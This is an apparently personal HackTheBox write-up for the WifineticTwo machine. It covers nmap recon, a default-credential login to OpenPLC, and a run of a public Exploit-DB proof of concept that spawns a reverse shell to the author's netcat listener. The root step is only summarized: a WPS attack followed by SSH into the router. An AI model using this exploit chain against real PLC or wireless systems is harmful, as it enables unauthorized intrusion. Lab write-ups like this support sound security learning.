# WifineticTwo
Sunday Funday came early tonight. Was able to work on a box before midnight which was nice!

Metadata:
- OS: Linux
- Difficulty: Medium
- Status: Active
- IP: 10.10.11.7

## Recon
```bash
# Nmap 7.94SVN scan initiated Wed Mar 27 22:22:11 2024 as: nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -Pn -oN all-ports-nmap-report 10.10.11.7
Nmap scan report for 10.10.11.7
Host is up, received user-set (0.073s latency).
Scanned at 2024-03-27 22:22:11 CDT for 22s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done at Wed Mar 27 22:22:33 2024 -- 1 IP address (1 host up) scanned in 21.47 seconds
```

### Visting Website
We see the website is using OpenPLC and of course it uses default credentials of `openplc/openplc`. Boom logged in.

### Searching ExploitDB proved successful
`https://www.exploit-db.com/exploits/49803` Looks like there is a PoC for injecting the reverse shell code from a program loaded by a user. Shoutout to FELLIPE OLIVEIRA for the script!

This made for an easy access to the box!
Before I run the script, in a separate shell I run `nc -lnvp 4444`

```bash
python exploit.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.2 -r 4444
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://10.10.11.7:8080 is Up...
[+] Host Up! ...
[+] Trying to authenticate with credentials openplc:openplc
[+] Login success!
[+] PLC program uploading...
[+] Attempt to Code injection...
[+] Spawning Reverse Shell...
```

## User Flag
Also, I'd like to thank [Maxat Akbanov](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal) I'm always googling how to stabalize a shell and come to this article!
Once the shell connects, I use Maxat's commands to stabalize the shell.

`cat /root/user.txt`

## Root Flag
At this point, we actually got stuck and had to look up help. Fortunately, [Mr. Bandwidth](https://mrbandwidth.medium.com/wifinetictwo-writeup-walkthrough-htb-hackthebox-remote-code-execution-33b501b69579) had a solution. Thank you!

We were so close to not needing assistance, but we didn't think/realize this box would need wireless hacking. This is also where things sort of went out of sync. We kept crashing the box and had to retry.

So without having to repeat, we essentially followed Mr. Bandwidth commands verbatim. The things we learned was how to search for a wireless network and find a PoC for WPS 1.0. Running the command to get the PSK was trivial.

Unfortunately, trying to get connected kept causing errors.

Some of the errors we saw:
- accidentally setting a Device interface
- trying to use DHCP

After the 3rd lockout, we just followed his suggestion of manually setting an IP and trying to ssh to the default router IP which happened to be `ssh root@192.168.1.1` Unsure, if that is a common IP for a wireless network. Something to research.

`cat /root.txt` as soon as you get on the router


# Final Thoughts
This box was honestly not difficult if you proactively search Exploit-DB and PoC for the tool being used (sources lik github for example). Having access to an RCE and seeing default credentials work. Made this first part a joke.

The difficulty came in trying to get onto the wireless network which was 100% new to me. Learned a lot of stuff, definitely recommend trying yourself.



